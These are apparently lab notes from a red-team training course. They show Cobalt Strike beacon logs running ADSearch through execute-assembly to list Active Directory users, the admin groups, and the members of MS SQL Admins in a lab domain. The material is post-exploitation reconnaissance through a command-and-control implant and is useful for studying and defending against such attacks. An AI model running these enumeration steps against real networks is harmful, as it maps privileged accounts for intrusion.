all users
```powershell
[11/27 19:14:00] beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
[11/27 19:14:04] [*] Tasked beacon to run .NET program: ADSearch.exe --search "objectCategory=user"
[11/27 19:14:05] [+] host called home, sent: 486200 bytes
[11/27 19:14:05] [+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[11/27 19:14:06] [+] received output:
[*] TOTAL NUMBER OF SEARCH RESULTS: 11

[11/27 19:14:06] [+] received output:
	[+] cn : Administrator
	[+] cn : Guest
	[+] cn : krbtgt
	[+] cn : CYBER$
	[+] cn : Bob Farmer
	[+] cn : John King
	[+] cn : Nina Lamb
	[+] cn : MS SQL Service
	[+] cn : Squid Proxy
	[+] cn : STUDIO$
	[+] cn : Honey Token

```
admins
```powershell
[11/27 19:22:54] beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
[11/27 19:22:58] [*] Tasked beacon to run .NET program: ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
[11/27 19:22:58] [+] host called home, sent: 486236 bytes
[11/27 19:22:59] [+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[11/27 19:22:59] [+] received output:
[*] TOTAL NUMBER OF SEARCH RESULTS: 5
	[+] cn : Domain Admins
	[+] cn : Key Admins
	[+] cn : DnsAdmins
	[+] cn : MS SQL Admins
	[+] cn : Studio Admins

```

```powershell
[11/27 19:23:28] beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
[11/27 19:23:33] [*] Tasked beacon to run .NET program: ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
[11/27 19:23:33] [+] host called home, sent: 486294 bytes
[11/27 19:23:33] [+] received output:

    ___    ____  _____                 __  
   /   |  / __ \/ ___/___  ____ ______/ /_ 
  / /| | / / / /\__ \/ _ \/ __ `/ ___/ __ \
 / ___ |/ /_/ /___/ /  __/ /_/ / /__/ / / /
/_/  |_/_____//____/\___/\__,_/\___/_/ /_/ 
                                           
Twitter: @tomcarver_
GitHub: @tomcarver16
            
[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1

[11/27 19:23:33] [+] received output:
	[+] cn     : MS SQL Admins
	[+] member : CN=John King,CN=Users,DC=dev,DC=cyberbotic,DC=io

```